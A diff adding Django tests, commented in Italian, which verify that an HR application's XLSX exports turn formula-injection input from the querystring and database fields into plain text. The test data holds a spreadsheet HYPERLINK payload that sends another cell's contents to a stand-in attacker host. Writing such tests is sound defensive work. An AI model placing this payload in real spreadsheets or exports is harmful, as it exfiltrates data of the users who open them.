@@ -1763,3 +1763,79 @@ class MpqExportTests(TestCase):
         base = reverse("anagrafica:export", args=["mpq_vista"])
         self.assertIn(f'{base}?format=xlsx&amp;scope=filtered&amp;tutti=1"', html)
         self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)
+
+
+@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
+class ExportFormulaInjectionEndToEndTests(TestCase):
+    """SICUREZZA end-to-end: il .xlsx scaricato non contiene MAI formule vive.
+
+    Due canali di iniezione, entrambi coperti:
+      • la querystring (``?q=…``), riflessa nell'etichetta filtri in intestazione:
+        basterebbe far cliccare a un utente HR un link preparato ad arte (oggi
+        ogni ``filters_label`` antepone un prefisso — `Ricerca: "…"` — ma la
+        garanzia non deve dipendere da quel dettaglio di formattazione);
+      • i testi liberi del DB (qui il nome e la descrizione di una mansione).
+    """
+
+    PAYLOAD = '=HYPERLINK("http://evil.invalid/?"&A2,"apri")'
+
+    def setUp(self):
+        self.admin = User.objects.create_superuser("admin_inj", "inj@example.invalid", "x")
+        self.client.force_login(self.admin)
+        Mansione.objects.create(
+            # Il nome contiene il payload (così la ricerca malevola lo intercetta),
+            # la descrizione lo porta in testa alla cella: entrambi testi liberi da DB.
+            nome=f"Addetto verniciatura {self.PAYLOAD}",
+            livello_rischio=Mansione.RISCHIO_ALTO,
+            descrizione=self.PAYLOAD,
+        )
+
+    def _sheet(self, content: bytes):
+        from io import BytesIO
+
+        from openpyxl import load_workbook
+
+        return load_workbook(BytesIO(content)).active
+
+    def _sheet_xml(self, content: bytes) -> bytes:
+        import zipfile
+        from io import BytesIO
+
+        with zipfile.ZipFile(BytesIO(content)) as zf:
+            return zf.read("xl/worksheets/sheet1.xml")
+
+    def test_malicious_querystring_does_not_produce_a_live_formula(self):
+        from urllib.parse import urlencode
+
+        url = (
+            reverse("anagrafica:export", args=["mansioni"])
+            + "?format=xlsx&scope=filtered&"
+            + urlencode({"q": self.PAYLOAD})
+        )
+        resp = self.client.get(url)
+        self.assertEqual(resp.status_code, 200)
+        self.assertEqual(resp["Content-Type"], XLSX_CT)
+
+        ws = self._sheet(resp.content)
+        # L'etichetta filtri (riga 5) riflette la querystring: deve restare TESTO.
+        self.assertIn(self.PAYLOAD, str(ws["A5"].value))
+        self.assertNotEqual(ws["A5"].data_type, "f")
+        # La ricerca malevola intercetta la mansione: la riga dati è nel file…
+        self.assertEqual(ws.cell(row=8, column=4).value, self.PAYLOAD)
+        # …e nessuna cella del foglio è una formula viva.
+        self.assertNotIn(b"<f>", self._sheet_xml(resp.content))
+        for row in ws.iter_rows():
+            for cell in row:
+                self.assertNotEqual(cell.data_type, "f")
+
+    def test_db_text_starting_with_equals_does_not_produce_a_live_formula(self):
+        resp = self.client.get(
+            reverse("anagrafica:export", args=["mansioni"]) + "?format=xlsx&scope=full"
+        )
+        self.assertEqual(resp.status_code, 200)
+        ws = self._sheet(resp.content)
+        # Colonna «Descrizione» = 4ª colonna, prima riga dati (riga 8).
+        cell = ws.cell(row=8, column=4)
+        self.assertEqual(cell.value, self.PAYLOAD)
+        self.assertNotEqual(cell.data_type, "f")
+        self.assertNotIn(b"<f>", self._sheet_xml(resp.content))
